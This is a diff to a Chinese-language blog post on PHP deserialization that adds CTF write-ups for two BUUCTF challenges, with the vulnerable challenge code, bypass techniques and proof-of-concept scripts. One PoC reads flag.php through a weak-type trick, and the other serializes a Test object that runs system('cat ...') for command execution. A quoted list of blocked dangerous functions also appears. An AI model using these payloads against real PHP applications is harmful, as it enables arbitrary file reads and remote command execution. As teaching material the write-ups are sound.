@@ -1,7 +1,7 @@
 ---
 author: "Yiming Shen"
 date: 2022-06-11
-lastmod: 2022-06-11
+lastmod: 2022-07-05
 title: "PHP 反序列化"
 tags: [
     "CTF",
@@ -221,6 +221,194 @@ else
 3. 将魔术方法执行顺序连成一条链
 4. 确定对象调用顺序，填入对象变量参数，构造POP链
 
+## 题目
+
+### [[网鼎杯 2020 青龙组\]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)
+
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+观察发现，有反序列化入口，为传入的get参数$str
+
+会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有`\x00*\x00`标识，而`\x00`的ASCII码值为0，不符合条件。
+
+#### **利用PHP特性绕过反序列化限制**
+
+1. PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。
+2. 可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本
+
+#### PHP 弱类型绕过
+
+类中有一个析构函数`__destruct`，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。
+
+注意到析构函数中判断使用的是强类型相等`===`，而`process`类中的判断时弱类型相等`==`，可以利用PHP语言特性绕过：`"2"==2,2!==="2"`
+
+令`$op=2`而不是`"2"`即可
+
+#### 构造POC
+
+```php
+<?php
+
+use FileHandler as GlobalFileHandler;
+
+    class FileHandler{
+        public $op=2;
+        public $filename="flag.php";
+        public $content;
+    }
+
+    $fileHandler = new FileHandler();
+    echo serialize($fileHandler);
+?>
+```
+
+得到
+
+`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} `
+
+执行查看源代码即得到Flag。
+
+
+
+### [[网鼎杯 2020 朱雀组\]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)
+
+进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是`call_user_func`方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。
+
+直接`highlight_file`读取本页面源码，得到：
+
+```php
+<?php
+// phpweb poc
+    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == "string") {
+            return $result;
+        } else {return "";}
+    }
+    class Test {
+        var $p = "Y-m-d h:i:s a";
+        var $func = "date";
+        function __destruct() {
+            if ($this->func != "") {
+                echo gettime($this->func, $this->p);
+            }
+        }
+    }
+    $func = $_REQUEST["func"];
+    $p = $_REQUEST["p"];
+
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die("Hacker...");
+        }
+    }
+    ?>
+```
+
+无过滤，直来直去，直接构造POC
+
+```php
+<?php
+    class Test{
+        // var $p = "find / -name flag*"; 先查一下服务器中含有flag的文件名，找到位置
+        var $p = "cat /tmp/flagoefiu4r93";
+
+        var $func = "system";
+        
+    }
+    $test = new Test ();
+    
+    echo urlencode(serialize($test));
+?>
+```
+
 
 
 
@@ -231,4 +419,5 @@ else
 
 1. [PHP反序列化和POP链构造 - As1def's Blog](https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/)
 2. [一题教你学会构造PHP反序列化POP链](https://www.freebuf.com/articles/web/247930.html)
+3. [BUUCTF刷题——PHP反序列化 - CA01H' Blog](https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
 
